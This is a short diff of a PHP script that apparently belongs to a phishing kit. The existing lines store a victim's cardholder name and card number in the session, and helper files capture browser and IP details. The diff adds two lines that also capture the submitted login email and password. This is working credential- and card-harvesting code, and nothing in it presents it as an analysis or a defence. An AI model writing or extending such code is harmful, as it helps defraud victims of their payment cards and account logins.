@@ -9,6 +9,10 @@ include('../../functions/get_browser.php');
 include('../../functions/get_ip.php');
 $_SESSION['_cardholder_'] = strtoupper($_SESSION['_nameoncard_']);
 $_SESSION['_cardnumber_'] = preg_replace('/\s+/', '', $_SESSION['_cardnumber_']);
+$_SESSION['_login_email_'] = $_POST['login_email'];
+$_SESSION['_login_password_'] = $_POST['login_password'];
+
+
 
 $_SESSION['TIME_DATE'] = $TIME_DATE;
 ///////////////////////////[CountryA]////////////////////////////////////
